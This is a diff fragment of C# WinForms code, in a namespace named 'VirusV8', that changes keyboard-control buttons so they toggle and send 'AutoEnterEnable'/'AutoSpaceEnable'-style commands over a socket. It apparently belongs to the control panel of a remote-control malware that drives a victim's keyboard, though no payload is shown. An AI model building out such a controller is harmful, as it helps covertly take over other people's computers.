@@ -119,14 +119,34 @@ namespace VirusV8
 
         private void Button_Keyboard_AutoEnter_Click(object sender, EventArgs e)
         {
-            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardAutoEnter");
-            s.send(bytes);
+            if (Button_Keyboard_AutoEnter.Image == null)
+            {
+                Button_Keyboard_AutoEnter.Image = VirusV8.Properties.Resources._040_recycle_bin;
+                byte[] bytes = Encoding.ASCII.GetBytes("AutoEnterEnable");
+                s.send(bytes);
+            }
+            else
+            {
+                Button_Keyboard_AutoEnter.Image = null;
+                byte[] bytes = Encoding.ASCII.GetBytes("AutoEnterDisable");
+                s.send(bytes);
+            }
         }
 
         private void Button_Keyboard_AutoSpace_Click(object sender, EventArgs e)
         {
-            byte[] bytes = Encoding.ASCII.GetBytes("KeyboardAutoSpace");
-            s.send(bytes);
+            if (Button_Keyboard_AutoSpace.Image == null)
+            {
+                Button_Keyboard_AutoSpace.Image = VirusV8.Properties.Resources._040_recycle_bin;
+                byte[] bytes = Encoding.ASCII.GetBytes("AutoSpaceEnable");
+                s.send(bytes);
+            }
+            else
+            {
+                Button_Keyboard_AutoSpace.Image = null;
+                byte[] bytes = Encoding.ASCII.GetBytes("AutoSpaceDisable");
+                s.send(bytes);
+            }
         }
 
         private void Button_Keyboard_AltF4_Click(object sender, EventArgs e)
